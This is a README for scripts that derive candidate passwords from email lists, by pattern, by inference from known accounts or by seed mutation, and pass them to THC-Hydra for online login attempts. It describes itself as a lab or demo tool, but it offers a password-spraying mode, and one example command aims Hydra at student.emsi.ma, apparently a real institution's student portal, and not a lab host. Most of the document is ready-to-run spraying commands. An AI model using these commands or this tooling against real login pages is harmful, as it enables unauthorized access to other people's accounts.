# Demo credential generator

Generates **passwords from a pattern** for a list of **emails** you already control (dev/demo/staging).

## What this is NOT

- Not password **cracking** or **recovery** for unknown accounts  
- Not for use against real users without explicit authorization  
- Does not read databases or breach data — only applies **your** pattern template

## Random variants from one seed password

Hydra does **not** invent passwords. **`seed_variants.py`** mutates your seed and writes **`hydra-C.txt`**:

```bash
# One different variant per email (deterministic from seed + email)
python3 seed_variants.py dummies/dummies.csv --seed-password 'MyBasePass123!' -o ~/hydra-out/hydra-C.txt

# Same random variant tried on every email
python3 seed_variants.py dummies/dummies.csv --seed-password 'MyBasePass123!' --mode one-for-all -o ~/hydra-out/hydra-C.txt

# Many variants × every email (spray)
python3 seed_variants.py dummies/dummies.csv --seed-password 'MyBasePass123!' --mode spray --variant-count 10 -o ~/hydra-out/hydra-C.txt
```

Or in one step with Hydra:

```bash
python3 run_hydra_test.py dummies/dummies.csv \
  --seed-password 'MyBasePass123!' --seed-mode per-email \
  --target student.emsi.ma --service https-post-form --form '...' \
  --hydra-no-output-file --confirm-lab-scope
```

For **rule-based** passwords (e.g. `{First}123!` from one known account), use **`--base-email` + `--base-password`**, not `--seed-password`.

## One command (Python + Hydra)

After `apt install hydra` or building `thc-hydra`, from this directory:

```bash
python3 run_hydra_test.py demo-emails.csv \
  --base-email 'known@lab.local' --base-password 'KnownPass!' \
  --target demo.lab.local --service https-post-form \
  --form '/login:user=^USER^&pass=^PASS^:F=Invalid credentials' \
  --confirm-lab-scope
```

Preview without sending requests:

```bash
python3 run_hydra_test.py demo-emails.csv ... --dry-run
```

Pass `--hydra-bin /path/to/thc-hydra/hydra` if Hydra is not on `PATH`.

## Bot inputs and output

| Input | What it is |
|--------|------------|
| **Emails file** (CSV or `.txt`) | One email per line, or CSV with an `email` column / first column only |
| **Reference password** | One known account: `--base-email` + `--base-password`, or a `--samples` CSV with `email,password` |
| **Output file** (`--output`) | Derived password for every email in the list |

The bot does **not** crack passwords. It assumes every account uses the **same rule** as your reference (e.g. `{First}123!`), learns that rule from the reference, then **derives** each row.

**Output formats**

- `--format csv` (default): `email,password` with header  
- `--format pairs`: one line per account — `email: password`

### Simplest flow (one known password + email list)

```bash
python3 demo_password_bot.py emails.csv \
  --base-email customer@example.com \
  --base-password 'Customer123!' \
  --output results.csv
```

Or with colon-style lines:

```bash
python3 demo_password_bot.py emails.csv \
  --base-email customer@example.com \
  --base-password 'Customer123!' \
  --output results.txt \
  --format pairs
```

Example `results.txt`:

```text
customer@example.com: Customer123!
viewer@example.com: Viewer123!
```

### Multiple reference rows (optional, improves accuracy)

If you know the password for **one or two** demo users and the rest follow the same rule:

```bash
python3 demo_password_bot.py example-emails.txt \
  --samples example-samples.csv \
  --output creds.csv
```

The bot infers the pattern (e.g. `{First}123!`) from samples, then generates passwords for every email in the list.

Print the inferred pattern only:

```bash
python demo_password_bot.py --samples example-samples.csv --print-pattern
```

## Manual pattern (no inference)

```bash
python generate_passwords.py emails.txt --pattern "{First}123!" --output creds.csv
```

### Example `emails.txt`

```text
customer@example.com
viewer@example.com
hr.user@company.local
```

### Pattern placeholders

| Placeholder | Meaning |
|-------------|---------|
| `{local}` | part before `@` |
| `{local_nodot}` | local without dots |
| `{first}` | segment before first `.` |
| `{last}` | segment after last `.` |
| `{First}` / `{Last}` | capitalized |
| `{domain}` | full domain |
| `{domain_base}` | first label of domain |
| `{index}` | line number (see `--start-index`) |
| `{LOCAL}` | local part uppercase |

Text outside `{...}` is literal, e.g. `Acme-{index}-Demo!`

### Atlas-style example

```bash
python generate_passwords.py emails.txt --pattern "{First}123!" 
# customer@example.com → Customer123!
# viewer@example.com   → Viewer123!
```

## Enterprise baseline audit (offline)

For authorized private tests (“do demo accounts still match our old password baseline?”), use **`baseline_audit.py`** — generates candidates from a baseline file and optionally checks an **internal hash export** (no login requests). See `docs/BASELINE_ASSESSMENT.md`.

## Security

Store output CSV securely; delete when demo is torn down. Use unique passwords per environment in production.
